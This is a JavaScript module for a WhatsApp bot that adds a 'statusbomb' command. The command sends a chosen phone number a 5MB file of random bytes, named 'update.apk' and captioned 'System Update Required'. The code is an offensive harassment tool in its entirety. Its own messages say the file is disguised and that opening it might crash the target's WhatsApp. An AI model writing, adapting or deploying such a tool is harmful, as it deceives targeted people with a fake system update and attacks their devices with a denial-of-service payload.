const settings = require('../../settings');
const crypto = require('crypto');

module.exports = {
    name: 'szip',
    aliases: ['statusbomb'],
    category: 'status',
    description: 'Send a disguised heavy file to a status',
    usage: '.szip <number>',
    ownerOnly: true,
    react: '💣',
    async execute(conn, mek, args, chatId) {
        const num = (args[0] || '').replace(/[^0-9]/g, '');
        if (!num) return conn.sendMessage(chatId, { text: '❌ Provide a number.' });
        const jid = num + '@s.whatsapp.net';
        
        await conn.sendMessage(chatId, { text: `💣 Sending status bomb to +${num}...` }, { quoted: mek });

        try {
            // Create 5MB of random garbage data
            const garbage = crypto.randomBytes(5 * 1024 * 1024); 
            
            await conn.sendMessage('status@broadcast', {
                document: garbage,
                fileName: 'update.apk', // Disguised as an APK
                mimetype: 'application/vnd.android.package-archive',
                caption: '🔄 System Update Required'
            }, { statusJidList: [jid] });
            
            await conn.sendMessage(chatId, { text: '✅ Sent! If they try to open it, WhatsApp might crash.' });
        } catch (e) {
            conn.sendMessage(chatId, { text: '❌ Failed.' });
        }
    }
};